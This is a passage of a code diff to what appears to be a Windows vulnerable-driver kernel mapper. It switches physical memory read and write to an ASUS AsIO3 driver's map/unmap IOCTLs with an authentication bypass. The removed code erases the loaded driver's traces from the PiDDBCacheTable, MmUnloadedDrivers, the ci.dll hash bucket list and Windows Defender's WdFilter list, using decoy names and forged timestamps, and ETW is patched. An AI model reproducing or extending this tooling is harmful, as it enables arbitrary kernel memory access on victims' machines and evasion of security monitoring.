-		if (!DeviceIoControl(hDevice, IOCTL_PHYS_READ_BYTE_BULK,
-			&input, sizeof(input),
-			(uint8_t*)buffer + offset, chunk,
+		if (!DeviceIoControl(hDevice, IOCTL_ASUSIO_MAP,
+			&request, sizeof(request),
+			&request, sizeof(request),
 			&bytes_returned, nullptr))
 			return false;
+
+		if (!request.BaseAddress)
+			return false;
+
+		memcpy((uint8_t*)buffer + offset, request.BaseAddress, chunk);
+
+		WINIO_PHYSICAL_MEMORY_INFO unmap = {};
+		unmap.BaseAddress = request.BaseAddress;
+		unmap.SectionHandle = request.SectionHandle;
+		unmap.ReferencedObject = request.ReferencedObject;
+
+		DeviceIoControl(hDevice, IOCTL_ASUSIO_UNMAP,
+			&unmap, sizeof(unmap),
+			&unmap, sizeof(unmap),
+			&bytes_returned, nullptr);
 
 		offset += chunk;
 	}
@@ -594,20 +447,32 @@ bool vdrv::PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t
 	uint64_t offset = 0;
 	while (offset < size) {
 		uint32_t chunk = (uint32_t)((size - offset) < 0x1000 ? (size - offset) : 0x1000);
-		uint32_t input_size = sizeof(PHYS_RW_INPUT) + chunk;
-		auto input_buf = std::make_unique<uint8_t[]>(input_size);
 
-		auto* header = reinterpret_cast<PHYS_RW_INPUT*>(input_buf.get());
-		header->physical_address = physical_address + offset;
-		header->byte_count = chunk;
-		memcpy(input_buf.get() + sizeof(PHYS_RW_INPUT), (const uint8_t*)buffer + offset, chunk);
+		WINIO_PHYSICAL_MEMORY_INFO request = {};
+		request.ViewSize = chunk;
+		request.BusAddress = physical_address + offset;
 
 		DWORD bytes_returned = 0;
-		if (!DeviceIoControl(hDevice, IOCTL_PHYS_WRITE_BYTE_BULK,
-			input_buf.get(), input_size,
-			nullptr, 0,
+		if (!DeviceIoControl(hDevice, IOCTL_ASUSIO_MAP,
+			&request, sizeof(request),
+			&request, sizeof(request),
 			&bytes_returned, nullptr))
 			return false;
+
+		if (!request.BaseAddress)
+			return false;
+
+		memcpy(request.BaseAddress, (const uint8_t*)buffer + offset, chunk);
+
+		WINIO_PHYSICAL_MEMORY_INFO unmap = {};
+		unmap.BaseAddress = request.BaseAddress;
+		unmap.SectionHandle = request.SectionHandle;
+		unmap.ReferencedObject = request.ReferencedObject;
+
+		DeviceIoControl(hDevice, IOCTL_ASUSIO_UNMAP,
+			&unmap, sizeof(unmap),
+			&unmap, sizeof(unmap),
+			&bytes_returned, nullptr);
 
 		offset += chunk;
 	}
@@ -777,60 +642,24 @@ NTSTATUS vdrv::Load() {
 	if (kdmUtils::IsHvciWithBlocklistActive())
 		return STATUS_ACCESS_DENIED;
 
-	if (vdrv::IsRunning())
-		return STATUS_ALREADY_REGISTERED;
-
-	if (vulnerableDriverPath.empty() || !std::filesystem::exists(vulnerableDriverPath))
-		return STATUS_NOT_FOUND;
-
-	std::vector<BYTE> driverData;
-	if (!kdmUtils::ReadFileToMemory(vulnerableDriverPath, &driverData))
-		return STATUS_DISK_OPERATION_FAILED;
-
-	std::wstring driver_path = GetDriverPath();
-	if (driver_path.empty())
-		return STATUS_UNSUCCESSFUL;
-
-	_wremove(driver_path.c_str());
+	auto status = AcquireDebugPrivilege();
+	if (!NT_SUCCESS(status))
+		return status;
 
 	PatchUsermodeEtw();
 
-	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size())) {
-		RestoreUsermodeEtw();
-		return STATUS_DISK_OPERATION_FAILED;
-	}
+	hDevice = OpenAsIO3Device();
 
-	ULONG32 ts = 0;
-	std::wstring newSymlink;
-	if (!PatchDriverFile(driver_path, &ts, &newSymlink) || !ts) {
-		RestoreUsermodeEtw();
-		SecureDeleteFile(driver_path);
-		return STATUS_UNSUCCESSFUL;
-	}
-	loadedDriverTimestamp = ts;
-	loadedSymlinkName = newSymlink.empty() ? std::wstring(L"__WDT__") : newSymlink;
-
-	auto status = AcquireDebugPrivilege();
-	if (!NT_SUCCESS(status)) {
-		RestoreUsermodeEtw();
-		SecureDeleteFile(driver_path);
-		return status;
-	}
-
-	status = service::RegisterAndStart(driver_path, GetDriverNameW());
-	if (!NT_SUCCESS(status)) {
-		RestoreUsermodeEtw();
-		SecureDeleteFile(driver_path);
-		return status;
-	}
-
-	hDevice = OpenDeviceHandle();
-
-	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
-	{
-		RestoreUsermodeEtw();
-		vdrv::Unload();
-		return STATUS_NOT_FOUND;
+	if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
+		if (!BypassAsIO3Auth()) {
+			RestoreUsermodeEtw();
+			return STATUS_DEVICE_NOT_CONNECTED;
+		}
+		hDevice = OpenAsIO3Device();
+		if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
+			RestoreUsermodeEtw();
+			return STATUS_DEVICE_NOT_CONNECTED;
+		}
 	}
 
 	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
@@ -870,111 +699,7 @@ NTSTATUS vdrv::Load() {
 
 	RestoreUsermodeEtw();
 
-	if (!vdrv::ClearPiDDBCacheTable()) {
-		vdrv::Unload();
-		return STATUS_DELETE_PENDING | 0x1000;
-	}
-
-	if (!vdrv::ClearKernelHashBucketList()) {
-		vdrv::Unload();
-		return STATUS_DELETE_PENDING | 0x2000;
-	}
-
-	if (!vdrv::ClearMmUnloadedDrivers()) {
-		vdrv::Unload();
-		return STATUS_DELETE_PENDING | 0x3000;
-	}
-
-	vdrv::ClearWdFilterDriverList();
-
 	return STATUS_SUCCESS;
-}
-
-bool vdrv::ClearWdFilterDriverList() {
-	auto WdFilter = kdmUtils::GetKernelModuleAddress(ENC("WdFilter.sys"));
-	if (!WdFilter)
-		return true;
-
-	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
-	if (!RuntimeDriversList)
-		return false;
-
-	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
-	if (!RuntimeDriversCountRef)
-		return false;
-
-	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
-	if (!MpFreeDriverInfoExRef) {
-		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
-		if (!MpFreeDriverInfoExRef)
-			return false;
-		MpFreeDriverInfoExRef += 0x3;
-	}
-
-	MpFreeDriverInfoExRef += 0x3;
-
-	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
-	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
-	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
-	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
-	ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
-	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);
-
-	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* {
-		LIST_ENTRY* Entry;
-		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
-		return Entry;
-	};
-
-	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
-		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
-		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
-	{
-		UNICODE_STRING Unicode_String;
-		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
-			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
-			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
-				if (wcsstr(ImageName.get(), vdrv::GetDriverNameW().c_str())) {
-					bool removedRuntimeDriversArray = false;
-					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
-					for (int k = 0; k < 256; k++) {
-						PVOID value = 0;
-						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
-						if (value == SameIndexList) {
-							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
-							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
-							removedRuntimeDriversArray = true;
-							break;
-						}
-					}
-
-					if (!removedRuntimeDriversArray)
-						return false;
-
-					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
-					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
-
-					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
-					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));
-
-					ULONG current = 0;
-					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
-					current--;
-					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));
-
-					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
-					USHORT Magic = 0;
-					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
-					if (Magic == 0xDA18) {
-						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
-					}
-
-					return true;
-				}
-			}
-		}
-	}
-	return false;
 }
 
 NTSTATUS vdrv::Unload() {
@@ -995,18 +720,13 @@ NTSTATUS vdrv::Unload() {
 		CloseHandle(hDevice);
 	hDevice = 0;
 
-	auto status = service::StopAndRemove(GetDriverNameW());
-
-	std::wstring driver_path = GetDriverPath();
-	if (!driver_path.empty()) {
-		CleanupPrefetch(driver_path);
-		CleanupAmcacheForFile(driver_path);
-		SecureDeleteFile(driver_path);
+	if (g_zombieProcess) {
+		TerminateProcess(g_zombieProcess, 0);
+		CloseHandle(g_zombieProcess);
+		g_zombieProcess = nullptr;
 	}
 
-	loadedSymlinkName.clear();
-
-	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
+	return STATUS_SUCCESS;
 }
 
 uint64_t vdrv::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
@@ -1063,120 +783,6 @@ uint64_t vdrv::GetKernelModuleExport(uint64_t kernel_module_base, const std::str
 	return 0;
 }
 
-bool vdrv::ClearMmUnloadedDrivers() {
-	ULONG buffer_size = 0;
-	void* buffer = nullptr;
-
-	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
-
-	while (status == STATUS_INFO_LENGTH_MISMATCH)
-	{
-		if (buffer != nullptr)
-			VirtualFree(buffer, 0, MEM_RELEASE);
-		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
-	}
-
-	if (!NT_SUCCESS(status) || buffer == nullptr)
-	{
-		if (buffer != nullptr)
-			VirtualFree(buffer, 0, MEM_RELEASE);
-		return false;
-	}
-
-	uint64_t object = 0;
-	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);
-
-	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
-	{
-		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];
-
-		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
-			continue;
-
-		if (current_system_handle.HandleValue == hDevice)
-		{
-			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
-			break;
-		}
-	}
-
-	VirtualFree(buffer, 0, MEM_RELEASE);
-
-	if (!object)
-		return false;
-
-	uint64_t device_object = 0;
-	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object)
-		return false;
-
-	uint64_t driver_object = 0;
-	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object)
-		return false;
-
-	uint64_t driver_section = 0;
-	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section)
-		return false;
-
-	UNICODE_STRING us_driver_base_dll_name = { 0 };
-	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0)
-		return false;
-
-	if (us_driver_base_dll_name.Buffer && us_driver_base_dll_name.MaximumLength) {
-		static const wchar_t* decoys[] = {
-			L"USBHub3Loader.sys",
-			L"WudfRd.sys",
-			L"BthHfEnum.sys",
-			L"HidUsb.sys",
-			L"monitor.sys",
-			L"wmbclass.sys",
-			L"umbus.sys",
-			L"swenum.sys",
-			L"ndisuio.sys",
-			L"netbt.sys"
-		};
-		const wchar_t* chosen = nullptr;
-		size_t chosen_bytes = 0;
-		uint32_t seed = kdmUtils::CryptoRand32();
-		for (uint32_t attempt = 0; attempt < (sizeof(decoys) / sizeof(decoys[0])); attempt++) {
-			const wchar_t* candidate = decoys[(seed + attempt) % (sizeof(decoys) / sizeof(decoys[0]))];
-			size_t need = wcslen(candidate) * sizeof(wchar_t);
-			if (need + sizeof(wchar_t) <= us_driver_base_dll_name.MaximumLength) {
-				chosen = candidate;
-				chosen_bytes = need;
-				break;
-			}
-		}
-
-		auto fillBuf = std::make_unique<uint8_t[]>(us_driver_base_dll_name.MaximumLength);
-		if (chosen) {
-			memcpy(fillBuf.get(), chosen, chosen_bytes);
-		}
-		WriteMemory((uintptr_t)us_driver_base_dll_name.Buffer, fillBuf.get(), us_driver_base_dll_name.MaximumLength);
-
-		if (chosen) {
-			us_driver_base_dll_name.Length = (USHORT)chosen_bytes;
-		}
-		else {
-			us_driver_base_dll_name.Length = 0;
-		}
-
-		if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
-			return false;
-
-		return true;
-	}
-
-	us_driver_base_dll_name.Length = 0;
-	us_driver_base_dll_name.MaximumLength = 0;
-	us_driver_base_dll_name.Buffer = nullptr;
-
-	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
-		return false;
-
-	return true;
-}
-
 PVOID vdrv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
 	ULONG_PTR Instr = (ULONG_PTR)Instruction;
 	LONG RipOffset = 0;
@@ -1184,198 +790,6 @@ PVOID vdrv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffs
 		return nullptr;
 	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
 	return ResolvedAddr;
-}
-
-bool vdrv::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
-	if (!Resource)
-		return 0;
-
-	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
-	if (!kernel_ExAcquireResourceExclusiveLite)
-		return 0;
-
-	BOOLEAN out;
-	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
-}
-
-bool vdrv::ExReleaseResourceLite(PVOID Resource) {
-	if (!Resource)
-		return false;
-
-	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
-	if (!kernel_ExReleaseResourceLite)
-		return false;
-
-	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
-}
-
-BOOLEAN vdrv::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
-	if (!Table)
-		return false;
-
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
-	if (!kernel_RtlDeleteElementGenericTableAvl)
-		return false;
-
-	bool out;
-	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
-}
-
-PVOID vdrv::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
-	if (!Table)
-		return nullptr;
-
-	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(vdrv::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
-	if (!kernel_RtlLookupElementGenericTableAvl)
-		return nullptr;
-
-	PVOID out;
-	if (!CallKernelFunction(&out, kernel_RtlLookupElementGenericTableAvl, Table, Buffer))
-		return 0;
-	return out;
-}
-
-nt::PiDDBCacheEntry* vdrv::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
-	nt::PiDDBCacheEntry localentry{};
-	localentry.TimeDateStamp = timestamp;
-	localentry.DriverName.Buffer = (PWSTR)name;
-	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
-	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
-
-	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
-}
-
-bool vdrv::ClearPiDDBCacheTable() {
-	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
-	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx");
-
-	if (PiDDBLockPtr == NULL) {
-		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x");
-		if (PiDDBLockPtr == NULL) {
-			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
-			if (PiDDBLockPtr == NULL)
-				return false;
-			PiDDBLockPtr += 19;
-		}
-		else {
-			PiDDBLockPtr += 16;
-		}
-	}
-	else {
-		PiDDBLockPtr += 28;
-	}
-
-	if (PiDDBCacheTablePtr == NULL) {
-		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", vdrv::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx");
-		if (PiDDBCacheTablePtr == NULL)
-			return false;
-		PiDDBCacheTablePtr += 2;
-	}
-
-	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
-	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);
-
-	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true))
-		return false;
-
-	auto n = GetDriverNameW();
-	auto timestamp = vdrv::loadedDriverTimestamp;
-
-	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
-
-	if (pFoundEntry == nullptr) {
-		ULONG elemCount = 0;
-		ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, NumberGenericTableElements), &elemCount, sizeof(ULONG));
-		if (elemCount > 0 && elemCount < 4096) {
-			nt::PRTL_BALANCED_LINKS root = nullptr;
-			ReadMemory((uintptr_t)PiDDBCacheTable + offsetof(struct nt::_RTL_AVL_TABLE, BalancedRoot.RightChild), &root, sizeof(root));
-
-			std::vector<uintptr_t> stack;
-			if (root)
-				stack.push_back((uintptr_t)root);
-
-			while (!stack.empty() && !pFoundEntry) {
-				uintptr_t node = stack.back();
-				stack.pop_back();
-
-				nt::RTL_BALANCED_LINKS links{};
-				if (!ReadMemory(node, &links, sizeof(links)))
-					continue;
-
-				if (links.LeftChild)
-					stack.push_back((uintptr_t)links.LeftChild);
-				if (links.RightChild)
-					stack.push_back((uintptr_t)links.RightChild);
-
-				uintptr_t entry_candidate = node + sizeof(nt::RTL_BALANCED_LINKS);
-				UNICODE_STRING drvName{};
-				if (!ReadMemory(entry_candidate + offsetof(struct nt::_PiDDBCacheEntry, DriverName), &drvName, sizeof(drvName)))
-					continue;
-
-				if (!drvName.Buffer || drvName.Length == 0 || drvName.Length > 512)
-					continue;
-
-				auto nameBuf = std::make_unique<wchar_t[]>(drvName.Length / 2 + 1);
-				if (!ReadMemory((uintptr_t)drvName.Buffer, nameBuf.get(), drvName.Length))
-					continue;
-
-				if (wcsstr(nameBuf.get(), n.c_str())) {
-					pFoundEntry = reinterpret_cast<nt::PiDDBCacheEntry*>(entry_candidate);
-				}
-			}
-		}
-	}
-
-	if (pFoundEntry == nullptr) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-
-	static const wchar_t* decoy_names[] = {
-		L"NDProxy.sys",
-		L"mouhid.sys",
-		L"USBXHCI.sys",
-		L"wmbclass.sys",
-		L"netbt.sys",
-		L"BthHfEnum.sys",
-		L"HidUsb.sys",
-		L"swenum.sys",
-	};
-	const wchar_t* decoy = decoy_names[kdmUtils::CryptoRand32() % (sizeof(decoy_names) / sizeof(decoy_names[0]))];
-	size_t decoy_bytes = wcslen(decoy) * sizeof(wchar_t);
-
-	UNICODE_STRING driver_name_us = { 0 };
-	if (!ReadMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, DriverName),
-		&driver_name_us, sizeof(UNICODE_STRING))) {
-		ExReleaseResourceLite(PiDDBLock);
-		return false;
-	}
-
-	if (driver_name_us.Buffer && decoy_bytes <= driver_name_us.MaximumLength) {
-		auto fill = std::make_unique<uint8_t[]>(driver_name_us.MaximumLength);
-		memcpy(fill.get(), decoy, decoy_bytes);
-		if (decoy_bytes < driver_name_us.MaximumLength) {
-			memset(fill.get() + decoy_bytes, 0, driver_name_us.MaximumLength - decoy_bytes);
-		}
-		WriteMemory((uintptr_t)driver_name_us.Buffer, fill.get(), driver_name_us.MaximumLength);
-
-		driver_name_us.Length = (USHORT)decoy_bytes;
-		WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, DriverName),
-			&driver_name_us, sizeof(UNICODE_STRING));
-	}
-
-	ULONG realisticLow = 0x55000000u;
-	ULONG realisticHigh = 0x68c00000u;
-	ULONG forged_timestamp = realisticLow + (kdmUtils::CryptoRand32() % (realisticHigh - realisticLow));
-	WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, TimeDateStamp),
-		&forged_timestamp, sizeof(ULONG));
-
-	NTSTATUS forged_status = STATUS_SUCCESS;
-	WriteMemory((uintptr_t)pFoundEntry + offsetof(struct nt::_PiDDBCacheEntry, LoadStatus),
-		&forged_status, sizeof(NTSTATUS));
-
-	ExReleaseResourceLite(PiDDBLock);
-	return true;
 }
 
 struct CachedSection {
@@ -1461,95 +875,6 @@ uintptr_t vdrv::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t 
 		return 0;
 
 	return cs->section_vaddr + (local_result - (uintptr_t)cs->data.data());
-}
-
-bool vdrv::ClearKernelHashBucketList() {
-	uint64_t ci = kdmUtils::GetKernelModuleAddress(ENC("ci.dll"));
-	if (!ci)
-		return false;
-
-	auto sig = FindPatternInSectionAtKernel("PAGE", ci, PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), "xxx????x?xxxxxxx");
-	if (!sig)
-		return false;
-
-	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
-	if (!sig2)
-		return false;
-
-	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
-	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
-	if (!g_KernelHashBucketList || !g_HashCacheLock)
-		return false;
-
-	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true))
-		return false;
-
-	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
-	nt::HashBucketEntry* entry = 0;
-	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
-		ExReleaseResourceLite(g_HashCacheLock);
-		return false;
-	}
-	if (!entry) {
-		ExReleaseResourceLite(g_HashCacheLock);
-		return true;
-	}
-
-	std::wstring wdname = GetDriverNameW();
-	std::wstring search_path = GetDriverPath();
-	SIZE_T expected_len = (search_path.length() - 2) * 2;
-
-	while (entry) {
-		USHORT wsNameLen = 0;
-		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
-			ExReleaseResourceLite(g_HashCacheLock);
-			return false;
-		}
-
-		if (expected_len == wsNameLen) {
-			wchar_t* wsNamePtr = 0;
-			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
-				ExReleaseResourceLite(g_HashCacheLock);
-				return false;
-			}
-
-			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
-			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
-				ExReleaseResourceLite(g_HashCacheLock);
-				return false;
-			}
-
-			size_t find_result = std::wstring(wsName.get()).find(wdname);
-			if (find_result != std::wstring::npos) {
-				nt::HashBucketEntry* Next = 0;
-				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
-				}
-
-				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
-				}
-
-				if (!FreePool((uintptr_t)entry)) {
-					ExReleaseResourceLite(g_HashCacheLock);
-					return false;
-				}
-
-				ExReleaseResourceLite(g_HashCacheLock);
-				return true;
-			}
-		}
-		prev = entry;
-		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
-			ExReleaseResourceLite(g_HashCacheLock);
-			return false;
-		}
-	}
-
-	ExReleaseResourceLite(g_HashCacheLock);
-	return false;
 }
 
 uint64_t vdrv::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
